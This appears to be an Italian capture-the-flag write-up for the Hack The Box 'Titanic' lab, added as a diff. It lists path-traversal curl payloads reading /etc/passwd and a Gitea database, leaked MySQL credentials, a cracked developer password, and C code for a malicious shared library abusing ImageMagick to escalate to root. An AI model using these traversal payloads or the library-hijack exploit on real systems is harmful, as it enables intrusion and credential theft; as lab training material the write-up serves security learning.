@@ -1,0 +1,162 @@
+ooooooooooooo  o8o      .                          o8o            
+8'   888   `8  `"'    .o8                          `"'            
+     888      oooo  .o888oo  .oooo.   ooo. .oo.   oooo   .ooooo.  
+     888      `888    888   `P  )88b  `888P"Y88b  `888  d88' `"Y8 
+     888       888    888    .oP"888   888   888   888  888       
+     888       888    888 . d8(  888   888   888   888  888   .o8 
+    o888o     o888o   "888" `Y888""8o o888o o888o o888o `Y8bod8P' 
+                                                                  
+                                                                  
+                                                                  
+
+------------------------------------------------------------------------------
+
+[ 0x01 ] Abstract
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+HTB TITANIC - Walkthrough tecnico by NoFlyFre
+Target: titanic.htb
+
+------------------------------------------------------------------------------
+
+[ 0x02 ] Enumeration
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nmap -sS -p- 10.10.11.55 -T5
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+
+Port 80: web application, 22: SSH.
+
+------------------------------------------------------------------------------
+
+[ 0x03 ] Port 80 – Web Discovery
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nmap -sV -p 80 10.10.11.55 -T5
+
+80/tcp open  http Apache httpd 2.4.52
+
+Aggiunto titanic.htb a /etc/hosts.
+Sito = piattaforma di prenotazione viaggi.
+Booking → download JSON da /download?ticket=<uuid>.json
+
+------------------------------------------------------------------------------
+
+[ 0x04 ] Local File Inclusion (LFI)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Modifica del parametro ticket conferma LFI:
+
+curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
+
+Possibile accedere anche a:
+curl "http://titanic.htb/download?ticket=../../../../home/developer/user.txt"
+
+→ User flag ottenuta.
+
+------------------------------------------------------------------------------
+
+[ 0x05 ] dev.titanic.htb – Gitea Discovery
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+dev.titanic.htb → istanza Gitea, repo docker-config:
+
+services:
+  mysql:
+    environment:
+      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
+      MYSQL_USER: sql_svc
+      MYSQL_PASSWORD: sql_password
+
+Gitea DB path:
+ /home/developer/gitea/data/gitea/gitea.db
+
+LFI per scaricare:
+curl -s "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
+
+Estrazione credenziali con sqlite3.
+
+------------------------------------------------------------------------------
+
+[ 0x06 ] Cracking Developer Credentials
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Hash in formato hashcat (mode 10900):
+
+hashcat -m 10900 hash.txt rockyou.txt
+
+Result:
+developer:25282528
+
+→ SSH access gained.
+
+------------------------------------------------------------------------------
+
+[ 0x07 ] SSH Access as developer
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ssh developer@titanic.htb
+
+Script sospetto: /opt/scripts/identify_images.sh
+
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find . -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+
+------------------------------------------------------------------------------
+
+[ 0x08 ] Privilege Escalation via ImageMagick
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Versione ImageMagick (7.1.1-35) vulnerabile a RCE.
+
+Exploit: shared object malevolo libxcb.so.1
+
+gcc -x c -shared -fPIC -o libxcb.so.1 - << EOF
+#include <stdlib.h>
+__attribute__((constructor)) void init() {
+    system("cp /root/root.txt /tmp/root.txt;");
+}
+EOF
+
+mv libxcb.so.1 /opt/scripts/
+
+Script la carica e copia la root flag in /tmp.
+
+cat /tmp/root.txt
+
+→ Root flag ottenuta.
+
+------------------------------------------------------------------------------
+
+[ 0x09 ] Summary
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Step          | Description
+--------------|-------------------------------------------------------------
+nmap          | Enumerated open ports (22, 80)
+LFI           | Exploited /download?ticket= to read local files
+Gitea         | Found dev.titanic.htb and retrieved Gitea database
+DB Dump       | Extracted and cracked developer password from gitea.db
+SSH           | Gained shell access as developer
+ImageMagick   | Dropped malicious libxcb.so.1 to escalate privileges
+Root          | Read root flag via the triggered payload
+
+Rooted!
+
+------------------------------------------------------------------------------
+
+[ 0x0A ] Tags / Keywords
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+security, htb, walkthrough, pentest, NoFlyFre, hacking, writeup, titanic
+
+[ 0x0B ] Lingua
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ITA (Italiano)
+
+------------------------------------------------------------------------------
+
+[ 0x0C ] Credits & Disclaimer
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Autore: NoFlyFre
+Tutti i contenuti sono a scopo educativo e di ethical hacking.
+Usa queste informazioni in modo responsabile.
+
+------------------------------------------------------------------------------
+
+        .: Knowledge, Skillz, Root :.
+          .: Stay curious! :.
